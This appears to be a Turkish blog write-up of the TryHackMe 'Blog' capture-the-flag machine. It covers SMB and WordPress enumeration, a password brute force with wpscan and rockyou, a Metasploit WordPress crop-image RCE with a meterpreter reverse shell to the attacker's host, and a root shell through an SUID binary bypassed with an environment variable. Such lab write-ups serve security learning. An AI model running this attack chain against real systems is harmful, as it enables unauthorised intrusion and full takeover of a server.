---
title: "THM Blog Write Up"
date: 2020-10-07T11:49:09+03:00
draft: false
toc: true
images:
tags: [Tryhackme,write-up,Ghidra,Reverse Engineering,suid,Wordpress] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [Blog](https://tryhackme.com/room/blog) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/thm/blog/cover.png
  
---

Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [Blog](https://tryhackme.com/room/blog) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...

İlk olarak tasarımcı tarafından belirtilen domain adı /etc/hosts dosyasına eklenir.

{{< image src="/images/thm/blog/desc.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

## 1. Keşif Aşaması

Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.

```bash
sudo nmap -sV -sC 10.10.25.92 
```

{{< image src="/images/thm/blog/nmap.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Samba servisinde anonymous olarak paylaşıma açık olan dizinler kontrol edilir. 

```txt
─[barcode@parrot]─[~]$ smbclient -L //10.10.25.92
Enter WORKGROUP\barcode's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	BillySMB        Disk      Billy's local SMB Share
	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
BillySMB klasörü içeriğine bakılır. Paylaşıma açık olan dosyalar **get** komutu ile indirilir.

```text
─[barcode@parrot]─[~]$ smbclient  //10.10.25.92/BillySMB
Enter WORKGROUP\barcode's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 13:17:05 2020
  ..                                  D        0  Tue May 26 12:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 13:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 13:13:45 2020
  check-this.png                      N     3082  Tue May 26 13:13:43 2020

		15413192 blocks of size 1024. 9788764 blocks available
smb: \> get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (30.9 KiloBytes/sec) (average 30.9 KiloBytes/sec)
smb: \> get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (871.4 KiloBytes/sec) (average 508.1 KiloBytes/sec)
smb: \> get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (9.9 KiloBytes/sec) (average 453.0 KiloBytes/sec)
```
*Alice-White-Rabbit.jpg* dosyasında gizli bir mesaj olduğu steghide aracı ile tespit edilir. Daha sonra yine aynı araç ile rabbit_hole.txt dosyası export edilir. 

```terminal
─[barcode@parrot]─[~]$ steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
```
İçeriğine bakıldığında tuzak olduğu görülmektedir. :disappointed_relieved:
```terminal
─[barcode@parrot]─[~]$ cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.
```

Araştırmalara Web servisi üzerinden devam edilir. 80. portta Wordpress uygulaması çalışmaktadır. 


{{< image src="/images/thm/blog/webpage.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Robots.txt dosyası içeriğine bakılır.

{{< image src="/images/thm/blog/robots.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Wordpress uygulamalarında kolaylıkla bilgi toplamamızı sağlayan wpscan aracı ile tarama yapılır. Tarama sonucunda dikkat çeken bilgiler aşağıdadır.
```bash
wpscan --url http://blog.thm --enumerate
```

```terminal

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%


[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

Wordpress sürümü ile ilgili exploit araştırması yapıldığında düşük kullanıcı ile shell upload edilebilcek bir zafiyet tespit edilmektedir.

{{< image src="/images/thm/blog/exp.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Exploitin kullanımı için kullanıcı hesap bilgilerine ihtiyaç vardır. Wpscan aracı ile elde edilen hesaplara brute force saldırısı düzenlenir. İşlem soncunda kwhell adlı kullanıcıya ait parola elde edilir.

```bash
wpscan --url http://blog.thm -U user.lst -P /usr/share/wordlists/rockyou.txt
```

{{< image src="/images/thm/blog/pass.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Metasploit aracı açılır ve tespit edilen exploit modulü aranır. Seçilen modüle ait ayarlar options komutu görüntülenir.

*Not: Metasploit 6 sürümünde exploit işleminden sonra shell almada sıkıntılar olmaktadır.*

```bash
msfconsole -q
```

```txt
msf5 > search crop-image

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


msf5 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

```
Exploitin kullanımı için zorunlu parametlere set edilir.

```txt
> set password *********
> set username kwheel
> set rhosts 10.10.25.92
> set lhost 10.9.62.67
```

## 2. Erişim Sağlanması

Run/Exploit komutu ile meterpreter oturumu elde edilmiş olur.

*/home/bjoel* dizin içeriği kontrol edildiğinde user.txt dosyası görülmektedir.

{{< image src="/images/thm/blog/home.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

 İçerik görüntülendiğinde tam bir hayal kırılığıdır. :sob:

{{< image src="/images/thm/blog/fake.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

`shell` komutu ile meterpreter oturumdan normal terminal oturumuna geçilir. Sistem genelinde user.txt araması yapıldığında başka dosya bulunamaz. User.txt dosyası yüksek kullanıcı erişimine sahip bir dizin içerisinde yer almaktadır.

## 3. Yetki Yükseltme

Yetki yükseltmek için suid biti aktif dosyalar tespit edilir. 
```bash
find / -perm -u=s -type f 2>/dev/null
```
{{< image src="/images/thm/blog/suid.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

***/usr/sbin/checker*** uygulaması dikkat çekmektedir. Uygulama çalıştırıldığında <mark>Not an Admin </mark> hatası vermektedir. Uygulamanın işleyişinin daha iyi anlaşılabilmesi için uygulama home dizinine kopyalanır ve tersine mühendislik araçları ile incelenmek üzere locale indirilir.

> Not: Home dizininde `python2 -m SimpleHTTPServer 8000` komutu çalıştılır. İster tarayıcıdan ister curl, wget gibi araçlarla dosya indirilebilir. 

Ghridra ile binary analiz edilir. ***getenv("parametre")*** fonksiyonu parametre aldığı değeri ortam değişkenleri içerisinde arar varsa değerini döndürür. *Admin değişkeni varsa uid değeri 0 (root) olarak set edilir ve /bin/bash başlatılır.*


{{< image src="/images/thm/blog/ghidra.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Burada *admin* değeri ortam değişkeninleri içerisinde aranmaktadır. Bypass için `export` komutu ile admin değişkeni tanımlanır ve rastgele bir değer atanır.
```bash
export admin="test"
```
*/usr/sbin/checker* uygulaması çalıştırıldığında root yetkisi ile shell oturumu elde edilir.

```terminal
/usr/sbin/checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
Root dizini altında yer alan root.txt okunur.

{{< image src="/images/thm/blog/root.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

User.txt için `find` komutu ile arama yapıldığında /media/usb/ dizini altında bulunur. 

```bash 
find -name 'user.txt' 2>/dev/null
```
```terminal
/home/bjoel/user.txt
/media/usb/user.txt
```
{{< image src="/images/thm/blog/user.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}